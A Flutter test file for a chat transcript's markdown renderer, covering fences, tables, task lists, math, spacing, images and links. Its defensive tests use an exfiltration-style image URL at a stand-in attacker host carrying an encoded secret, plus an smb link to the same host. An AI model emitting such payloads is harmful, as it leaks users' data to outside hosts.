import 'dart:ui' show BoxHeightStyle;

import 'package:flutter/material.dart';
import 'package:flutter/rendering.dart';
import 'package:flutter/services.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:gpt_markdown/gpt_markdown.dart';
import 'package:ompanion/i18n/strings.g.dart';
import 'package:ompanion/screens/chat/transcript/code_block.dart';
import 'package:ompanion/screens/chat/transcript/markdown.dart';

List<MdNode> parse(String markdown) => Plusparse.parse(
  markdown,
  blockRegistry: MarkdownBlockRegistry([CommonMarkFence.backtick, CommonMarkFence.tilde]),
).children;

MdCustomBlock fence(MdNode node) => node as MdCustomBlock;

Future<void> pumpMarkdown(WidgetTester tester, String text) => tester.pumpWidget(
  TranslationProvider(
    child: MaterialApp(home: Scaffold(body: TranscriptMarkdown(text))),
  ),
);

void main() {
  group('CommonMarkFence', () {
    test('a backtick fence with an info string', () {
      final nodes = parse('before\n\n```dart title="x"\nvoid main() {}\n```\n\nafter');
      expect(nodes, hasLength(3));
      expect(fence(nodes[1]).body, 'void main() {}');
      expect(fence(nodes[1]).data, 'dart title="x"');
      expect(fence(nodes[1]).closed, isTrue);
      expect(nodes[2], isA<MdParagraph>());
    });

    test('a tilde fence', () {
      final nodes = parse('~~~python\nprint(1)\n~~~');
      expect(fence(nodes.single).type, 'tilde-fence');
      expect(fence(nodes.single).body, 'print(1)');
    });

    test('a longer fence keeps shorter fences as content', () {
      final nodes = parse('````markdown\n```bash\nls\n```\n````\ntail');
      expect(fence(nodes.first).body, '```bash\nls\n```');
      expect(fence(nodes.first).closed, isTrue);
      expect(nodes.last, isA<MdParagraph>());
    });

    test('a tilde fence is not closed by backticks and the reverse', () {
      expect(fence(parse('~~~\n```\n~~~').single).body, '```');
      expect(fence(parse('```\n~~~\n```').single).body, '~~~');
    });

    test('a closing line with text after the fence does not close it', () {
      final block = fence(parse('```\na\n``` not a closer\nb\n```').single);
      expect(block.body, 'a\n``` not a closer\nb');
    });

    test('an unclosed fence runs to the end while it streams', () {
      final block = fence(parse('text\n\n```ts\nconst a = 1;\nconst b').last);
      expect(block.closed, isFalse);
      expect(block.body, 'const a = 1;\nconst b');
    });

    test("the opener's indentation is removed from the content", () {
      final block = fence(parse('   ```\n   indented\n  less\n     more\n   ```').single);
      expect(block.body, 'indented\nless\n  more');
    });

    test('a backtick info string containing a backtick is not a fence', () {
      expect(parse('```a`b\ntext').first, isNot(isA<MdCustomBlock>()));
    });

    test('a fence inside a list item', () {
      final list = parse('1. Run:\n   ```bash\n   npm install\n   ```\n2. Done').single as MdOrderedList;
      final code = list.items.first.children.whereType<MdCustomBlock>().single;
      expect(code.body, 'npm install');
      expect(list.items, hasLength(2));
    });

    test('the streaming segment splitter keeps a fence with blank lines in one segment', () {
      final registry = MarkdownBlockRegistry([CommonMarkFence.backtick, CommonMarkFence.tilde]);
      expect(splitStreamSegments('a\n\n````md\n```\nx\n\ny\n```\n````\n\nb', blockRegistry: registry), [
        'a',
        '````md\n```\nx\n\ny\n```\n````',
        'b',
      ]);
    });
  });

  List<MdNode> parseBlocks(String markdown) => Plusparse.parse(
    markdown,
    blockRegistry: MarkdownBlockRegistry([const PipeTable(), TaskList.dash, TaskList.star, TaskList.plus]),
  ).children;

  group('PipeTable', () {
    test('header, alignments and body rows up to the first line without a pipe', () {
      final nodes = parseBlocks('| a | b | c |\n|:--|:-:|--:|\n| 1 | 2 |\n| x \\| y | z | w | extra |\nafter');
      final table = (nodes.first as MdCustomBlock).data! as MarkdownTable;
      expect(table.aligns, [TextAlign.left, TextAlign.center, TextAlign.right]);
      expect(table.rows, [
        ['a', 'b', 'c'],
        ['1', '2', ''],
        ['x | y', 'z', 'w'],
      ]);
      expect(nodes.last, isA<MdParagraph>());
    });

    test('without a complete delimiter row, as while it streams, it is not a table yet', () {
      expect(parseBlocks('| a | b |\n|---|:').first, isNot(isA<MdCustomBlock>()));
      expect(parseBlocks('| a | b |').first, isNot(isA<MdCustomBlock>()));
    });
  });

  group('TaskList', () {
    test('consecutive items of one marker with their continuation lines', () {
      final nodes = parseBlocks('- [x] done\n- [ ] open\n  more\n- plain');
      expect((nodes[0] as MdCustomBlock).data, [(true, 'done'), (false, 'open more')]);
      expect(nodes[1], isA<MdUnorderedList>());
      expect((parseBlocks('* [X] star').single as MdCustomBlock).data, [(true, 'star')]);
    });

    test('a bracketed link after a bullet is an ordinary list item', () {
      expect(parseBlocks('- [omp](https://example.com) docs').single, isA<MdUnorderedList>());
    });

    testWidgets('an item renders its inline markdown beside a box, without a bullet', (tester) async {
      await pumpMarkdown(tester, '- [x] **bold** task\n- [ ] open');
      expect(find.byIcon(Icons.check_box), findsOneWidget);
      expect(find.byIcon(Icons.check_box_outline_blank), findsOneWidget);
      expect(find.textContaining('bold task', findRichText: true), findsOneWidget);
    });
  });

  group('rewriteDollarMath', () {
    test('inline and display math', () {
      expect(rewriteDollarMath(r'Euler: $e^{i\pi}+1=0$.'), r'Euler: \(e^{i\pi}+1=0\).');
      expect(rewriteDollarMath('\$\$\n\\int_0^1 x\\,dx\n\$\$'), '\\[\n\\int_0^1 x\\,dx\n\\]');
    });

    test('prices and lone dollars stay text', () {
      expect(rewriteDollarMath(r'It costs $5 and $10 today.'), r'It costs $5 and $10 today.');
      expect(rewriteDollarMath(r'Pay $ 5 or $ 6'), r'Pay $ 5 or $ 6');
    });

    test('code spans and fences are left alone', () {
      expect(rewriteDollarMath(r'Run `echo $HOME` then `echo $PATH`.'), r'Run `echo $HOME` then `echo $PATH`.');
      const fenced = 'Math \$x\$\n\n```bash\necho \$A \$B\n```\n\n~~~\n\$y\$\n~~~\nand \$z\$';
      expect(rewriteDollarMath(fenced), 'Math \\(x\\)\n\n```bash\necho \$A \$B\n```\n\n~~~\n\$y\$\n~~~\nand \\(z\\)');
    });

    test('an escaped dollar is not math', () {
      expect(rewriteDollarMath(r'\$x\$ and $y$'), r'\$x\$ and \(y\)');
    });

    test('inline math does not cross lines', () {
      expect(rewriteDollarMath('\$a\nb\$'), '\$a\nb\$');
    });
  });

  group('images', () {
    const png = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=';

    testWidgets('a web image is not fetched until tapped; its alt text and host show instead', (tester) async {
      await pumpMarkdown(tester, 'Done. ![build log](https://evil.example/i.png?k=c2VjcmV0) ![](https://cdn.example/b.png)');
      expect(find.byType(Image), findsNothing);
      expect(find.text('build log'), findsOneWidget);
      expect(find.text('evil.example'), findsOneWidget);
      expect(find.text('cdn.example'), findsOneWidget);

      await tester.tap(find.text('Load image').first);
      await tester.pump();
      expect(
        tester.widget<Image>(find.byType(Image)).image,
        isA<NetworkImage>().having((image) => image.url, 'url', 'https://evil.example/i.png?k=c2VjcmV0'),
      );
      // The other image still waits for its own tap.
      expect(find.text('cdn.example'), findsOneWidget);
    });

    testWidgets('an inline data image is drawn right away', (tester) async {
      await pumpMarkdown(tester, '![dot](data:image/png;base64,$png)');
      expect(tester.widget<Image>(find.byType(Image)).image, isA<MemoryImage>());
      expect(find.text('Load image'), findsNothing);
    });

    test('alt text is found by the URL gpt_markdown hands the image builder', () {
      expect(markdownImageAlts(r'![a [b]](https://x.example/(1).png) ![\]c]( https://y.example/2.png )'), {
        'https://x.example/(1).png': 'a [b]',
        'https://y.example/2.png': r'\]c',
      });
    });

    test('paths name machine images; data, web and other URLs do not', () {
      expect(machineImagePath('/home/u/out/chart.png'), '/home/u/out/chart.png');
      expect(machineImagePath('~/shots/a.png'), '~/shots/a.png');
      expect(machineImagePath('out/chart%20v2.png'), 'out/chart v2.png');
      expect(machineImagePath('./chart.png'), './chart.png');
      expect(machineImagePath(r'C:\Users\u\shot.png'), r'C:\Users\u\shot.png');
      expect(machineImagePath('C:/Users/u/shot.png'), 'C:/Users/u/shot.png');
      expect(machineImagePath('file:///home/u/a%20b.png'), '/home/u/a b.png');
      expect(machineImagePath('file:///C:/Users/u/shot.png'), 'C:/Users/u/shot.png');
      expect(machineImagePath('file://host/srv/a.png'), '/srv/a.png');
      expect(machineImagePath('data:image/png;base64,$png'), isNull);
      expect(machineImagePath('https://example.com/a.png'), isNull);
      expect(machineImagePath('ftp://example.com/a.png'), isNull);
      expect(machineImagePath(''), isNull);
    });

    testWidgets('without a machine to load from, a path shows as text', (tester) async {
      await pumpMarkdown(tester, '![chart](out/chart.png)');
      expect(find.text('out/chart.png'), findsOneWidget);
      expect(find.byType(Image), findsNothing);
    });
  });

  group('rhythm', () {
    /// The line box of [needle]'s first character, or its last with [last], in the innermost paragraph holding it.
    Rect line(WidgetTester tester, String needle, {bool last = false}) {
      Rect? found;
      void visit(RenderObject object) {
        if (object is RenderParagraph) {
          final at = object.text.toPlainText().indexOf(needle);
          if (at >= 0) {
            final offset = last ? at + needle.length - 1 : at;
            final box = object.getBoxesForSelection(
              TextSelection(baseOffset: offset, extentOffset: offset + 1),
              boxHeightStyle: BoxHeightStyle.max,
            );
            found = MatrixUtils.transformRect(object.getTransformTo(null), box.first.toRect());
          }
        }
        object.visitChildren(visit);
      }

      visit(tester.binding.renderViews.single);
      return found ?? (throw StateError('no paragraph holds "$needle"'));
    }

    testWidgets('blocks, headings, list items and nested lists keep their gaps', (tester) async {
      tester.view.physicalSize = const Size(420, 1600);
      tester.view.devicePixelRatio = 1;
      addTearDown(tester.view.reset);
      await pumpMarkdown(tester, '''
The download client is fine.

Seeders count for nothing.

### Fixes
1. **Radarr:**
   - Set minimum seeders to ten on public indexers and leave private trackers at one.
   - Point the indexer at trans2.
2. **4K profile:** put every 2160p quality into one group so releases compete on score.
3. **Queue:** grab both.

After those changes:
```sh
curl -s localhost:7878
```

That is all.''');
      double gap(Rect above, Rect below) => below.top - above.bottom;
      Rect end(String text) => line(tester, text, last: true);
      Rect start(String text) => line(tester, text);
      final code = tester.getRect(find.byType(CodeBlock));

      // The multi-line cases really wrap.
      expect(end('at one.').top, greaterThan(start('Set minimum').top));
      expect(end('on score.').top, greaterThan(start('4K profile').top));
      expect(start('Seeders count').height, closeTo(14 * markdownLineHeight, 0.5));

      expect(gap(end('fine.'), start('Seeders count')), closeTo(12, 1), reason: 'paragraph to paragraph');
      expect(gap(end('for nothing.'), start('Fixes')), closeTo(20, 1), reason: 'block to heading');
      expect(gap(end('Fixes'), start('Radarr:')), closeTo(8, 1), reason: 'heading to its list');
      expect(gap(end('Radarr:'), start('Set minimum')), closeTo(4, 1), reason: 'item to its nested list');
      expect(gap(end('at one.'), start('Point the')), closeTo(6, 1), reason: 'nested item to nested item');
      expect(gap(end('at trans2.'), start('4K profile')), closeTo(8, 1), reason: "nested list to its parent's next item");
      expect(gap(end('on score.'), start('Queue:')), closeTo(6, 1), reason: 'multi-line item to the next item');
      expect(gap(end('grab both.'), start('After those')), closeTo(12, 1), reason: 'list to paragraph');
      expect(gap(end('changes:'), code), closeTo(12, 1), reason: 'paragraph to code');
      expect(gap(code, start('That is all')), closeTo(12, 1), reason: 'code to paragraph');
    });

    testWidgets('a text cut into parts keeps the gaps it has in one piece', (tester) async {
      // (above the cut, below it, the last text above, the first text below)
      const cuts = [
        ('Intro.\n\n### Fixes', 'First fix.', 'Fixes', 'First fix'),
        ('Intro.', '## Next', 'Intro.', 'Next'),
        ('1. one\n   - nested', '2. two', 'nested', 'two'),
        ('1. one', '- a bullet', 'one', 'a bullet'),
      ];
      Future<double> gap(Widget body, String above, String below) async {
        await tester.pumpWidget(TranslationProvider(child: MaterialApp(home: Scaffold(body: body))));
        return line(tester, below).top - line(tester, above, last: true).bottom;
      }

      for (final (a, b, above, below) in cuts) {
        final whole = await gap(TranscriptMarkdown('$a\n\n$b'), above, below);
        final parts = await gap(
          Column(crossAxisAlignment: CrossAxisAlignment.start, children: [TranscriptMarkdown(a), TranscriptMarkdown(b, previous: a)]),
          above,
          below,
        );
        expect(parts, closeTo(whole, 0.01), reason: '"$a" | "$b"');
      }
    });
  });

  group('links', () {
    const channel = MethodChannel('plugins.flutter.io/url_launcher');
    late List<String> launched;

    setUp(() {
      launched = [];
      TestDefaultBinaryMessengerBinding.instance.defaultBinaryMessenger.setMockMethodCallHandler(channel, (call) async {
        if (call.method == 'launch') launched.add((call.arguments as Map<Object?, Object?>)['url']! as String);
        return true;
      });
    });

    tearDown(() => TestDefaultBinaryMessengerBinding.instance.defaultBinaryMessenger.setMockMethodCallHandler(channel, null));

    testWidgets('web and mail links open directly', (tester) async {
      await pumpMarkdown(tester, '[docs](https://example.com/docs)\n\n[write](mailto:dev@example.com)');
      await tester.tap(find.text('docs', findRichText: true));
      await tester.tap(find.text('write', findRichText: true));
      await tester.pumpAndSettle();
      expect(find.byType(AlertDialog), findsNothing);
      expect(launched, ['https://example.com/docs', 'mailto:dev@example.com']);
    });

    testWidgets('any other scheme shows the full URL and opens only when confirmed', (tester) async {
      await pumpMarkdown(tester, '[the report](smb://evil.example/share/report)');
      await tester.tap(find.text('the report', findRichText: true));
      await tester.pumpAndSettle();
      expect(find.text('smb://evil.example/share/report'), findsOneWidget);
      expect(launched, isEmpty);

      await tester.tap(find.widgetWithText(TextButton, 'Cancel'));
      await tester.pumpAndSettle();
      expect(launched, isEmpty);

      await tester.tap(find.text('the report', findRichText: true));
      await tester.pumpAndSettle();
      await tester.tap(find.widgetWithText(FilledButton, 'Open'));
      await tester.pumpAndSettle();
      expect(launched, ['smb://evil.example/share/report']);
    });
  });
}
